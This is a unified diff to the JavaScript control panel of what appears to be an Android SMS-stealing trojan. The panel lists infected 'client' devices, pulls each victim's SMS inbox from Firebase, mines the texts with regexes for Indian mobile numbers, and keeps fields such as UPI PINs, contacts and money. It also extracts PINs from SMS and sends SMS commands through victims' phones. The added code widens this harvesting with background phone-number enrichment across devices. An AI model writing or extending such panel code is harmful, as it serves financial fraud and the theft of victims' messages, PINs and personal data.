@@ -81,8 +81,64 @@ function isHexDeviceKey(name){
   return typeof name==='string'&&/^[0-9a-f]{8,32}$/i.test(name);
 }
 /** APK device profile — may also carry pending SMS command fields on same node */
+function isCommandOnlyClientState(raw){
+  if(!raw||typeof raw!=='object')return false;
+  if(raw.modelName||raw.deviceId||raw.device_model||raw.Device_info)return false;
+  if(raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return false;
+  if(raw.sims&&(Array.isArray(raw.sims)?raw.sims.length:Object.keys(raw.sims).length))return false;
+  if(raw.sim1!=null||raw.sim2!=null||raw.sim_1!=null||raw.sim_2!=null)return false;
+  if(raw.d_name||raw.phone_number)return false;
+  return !!(raw.cmd||raw.sendSms||raw.messageText||raw.targetDeviceId||(raw.command&&raw.messageText)||(raw.action&&raw.messageText));
+}
+function extractPhoneFromSmsList(list){
+  if(!list||!list.length)return'';
+  var patterns=[
+    /Jio\s*(?:Number|no\.?)\s*[:\s]*([6-9]\d{9})/i,
+    /(?:Recharge|Plan).*?(?:Jio|Airtel|Vi)\s*(?:Number|no\.?)\s*[:\s]*([6-9]\d{9})/i,
+    /(?:your|registered)\s*(?:mobile|number|phone)\s*(?:is|:)\s*([6-9]\d{9})/i,
+    /\b([6-9]\d{9})\b.*(?:recharge|plan|validity|UPI|A\/C)/i
+  ], i, j, body, m, seen={}, out='';
+  for(i=0;i<Math.min(list.length,40);i++){
+    body=String((list[i]&&list[i].body)||'');
+    if(!body)continue;
+    for(j=0;j<patterns.length;j++){
+      m=body.match(patterns[j]);
+      if(m&&m[1]&&!seen[m[1]]){
+        seen[m[1]]=1;
+        out=m[1];
+        break;
+      }
+    }
+    if(out)return out;
+  }
+  return'';
+}
+function enrichDevicePhoneFromSms(devId){
+  if(!devId)return false;
+  var raw=clientsRawMap[devId];
+  if(!raw)return false;
+  if(raw.mobNo&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return false;
+  var cached=deviceSmsCache[devId];
+  if(!cached||!cached.list||!cached.list.length)return false;
+  var phone=extractPhoneFromSmsList(cached.list);
+  if(!phone)return false;
+  raw.mobNo=phone;
+  raw._phoneSource='sms_inbox';
+  clientsRawMap[devId]=raw;
+  return true;
+}
+function preserveProfileFieldsOnIngest(existing,data,norm){
+  if(!existing||!data||!norm||!isCommandOnlyClientState(data))return norm;
+  var fields=['mobNo','modelName','deviceId','device_model','brand','androidV','android','sims','sim1','sim2','sim_1','sim_2','phone','phone_number','mobile','name','joined','dateJoined','upipin','upiPin','liked','like','login','checked','money','contacts','device_info','sim_info','live_data','_phoneSource','_inferredPhone'];
+  fields.forEach(function(f){
+    if(existing[f]==null||existing[f]==='')return;
+    if(norm[f]==null||norm[f]===''||norm[f]==='Unknown')norm[f]=existing[f];
+  });
+  return norm;
+}
 function isDeviceProfileRecord(raw){
   if(!raw||typeof raw!=='object')return false;
+  if(isCommandOnlyClientState(raw))return false;
   if(raw.modelName||raw.deviceId||raw.device_model||raw.Device_info)return true;
   if(raw.d_name||raw.phone_number)return true;
   if(raw.mobNo!=null&&String(raw.mobNo).trim()&& !/^unknown$/i.test(String(raw.mobNo).trim()))return true;
@@ -1719,7 +1775,18 @@ function pickPhoneFromData(data){
   return apkPhoneFromRaw(data)||getPhoneFromRecordGeneric(data);
 }
 function ingestDeviceData(fbId,node,devId,data){
-  if(!data||typeof data!=='object'||isCommandQueueRecord(data))return;
+  if(!data||typeof data!=='object')return;
+  var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
+  if(isCommandOnlyClientState(data)){
+    var livePatch={_node:node,_fbId:fbId};
+    if(data.status!==undefined&&data.status!==null)livePatch.status=data.status;
+    if(data.battery!==undefined&&data.battery!==null)livePatch.battery=data.battery;
+    if(data.lastMessageTime)livePatch.lastMessageTime=data.lastMessageTime;
+    clientsRawMap[key]=Object.assign({},existing,livePatch);
+    processClientsData();
+    return;
+  }
+  if(isCommandQueueRecord(data))return;
   var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
   var picked=pickPhoneFromData(data);
   if(picked)norm.mobNo=picked;
@@ -1755,6 +1822,7 @@ function ingestDeviceData(fbId,node,devId,data){
   var saved={};
   keepFields.forEach(function(f){if(data[f]!==undefined&&data[f]!==null)saved[f]=data[f];});
   if(saved.mobNo!=null&&!norm.mobNo)norm.mobNo=String(saved.mobNo).trim();
+  norm=preserveProfileFieldsOnIngest(existing,data,norm);
   clientsRawMap[key]=Object.assign({},existing,saved,norm);
 }
 function getPhoneEnrichNodes(inst){
@@ -2029,6 +2097,7 @@ function processClientsData(){
 function processClientsDataNow(){
   allDevs=[];
   Object.keys(clientsRawMap).forEach(function(k){
+    enrichDevicePhoneFromSms(k);
     var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
     var on=deviceOnlineFromRaw(s,p.fbId);
     var contacts=s.contacts||extractContactsFromRecord(s);
@@ -2093,6 +2162,30 @@ function runBackgroundPinEnrichmentAll(){
     runBackgroundPinEnrichment(inst);
   });
 }
+function runBackgroundPhoneEnrichmentAll(){
+  var tasks=[], max=16, count=0;
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(count>=max)return;
+    var raw=clientsRawMap[k];
+    if(!raw)return;
+    if(raw.mobNo&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return;
+    if(deviceSmsCache[k]&&deviceSmsCache[k].list&&deviceSmsCache[k].list.length){
+      if(enrichDevicePhoneFromSms(k))return;
+    }
+    var p=parseDevKey(k), inst=getFbInstance(p.fbId);
+    if(!inst||!shouldUseApkSmsPath(inst,{rawId:p.devId,fbId:p.fbId,id:k}))return;
+    count++;
+    tasks.push(restJsonInst(inst,'messages/'+p.devId).then(function(data){
+      if(!data||typeof data!=='object')return;
+      var list=smsAsList(data).map(normalizeSms).filter(Boolean);
+      if(!list.length)return;
+      deviceSmsCache[k]={list:list.slice(0,60),at:Date.now()};
+      enrichDevicePhoneFromSms(k);
+    }).catch(function(){}));
+  });
+  if(!tasks.length)return;
+  Promise.all(tasks).then(function(){processClientsDataNow();});
+}
 function fetchAllData(force){
   if(_panelPaused)return Promise.resolve();
   if(_fetchAllInFlight&&!force)return Promise.resolve();
@@ -2114,6 +2207,7 @@ function fetchAllData(force){
     processClientsDataNow();
     insts.forEach(function(inst){if(inst.db)attachLive(inst);});
     setTimeout(function(){runBackgroundPinEnrichmentAll();},3000);
+    setTimeout(function(){runBackgroundPhoneEnrichmentAll();},1200);
   }).catch(function(){
     processClientsDataNow();
   }).then(function(){
@@ -2768,6 +2862,7 @@ function setDeviceSms(devId,list){
   persistSmsCacheSoon();
   var smsPin=extractPinFromSmsList(sms);
   if(smsPin&&applyPinToDevice(devId,smsPin))processClientsData();
+  if(enrichDevicePhoneFromSms(devId))processClientsDataNow();
   if(selDev===devId){
     window_allSms=sms;
     window_sms=sms.slice(0,80);
@@ -3549,7 +3644,11 @@ function sendSmsFetch(body){
   var apk=rebelApkHeaders();
   for(var k in apk)hdr[k]=apk[k];
   return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
-    .then(function(r){return r.json().then(function(j){return{httpOk:r.ok,data:j};});});
+    .then(function(r){
+      return r.json().then(function(j){return{httpOk:r.ok,data:j,status:r.status};})
+        .catch(function(){return{httpOk:false,data:{ok:false,error:'Bad response from server'},status:r.status};});
+    })
+    .catch(function(e){return{httpOk:false,data:{ok:false,error:String(e&&e.message?e.message:'Network error')},status:0};});
 }
 function sendSms(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
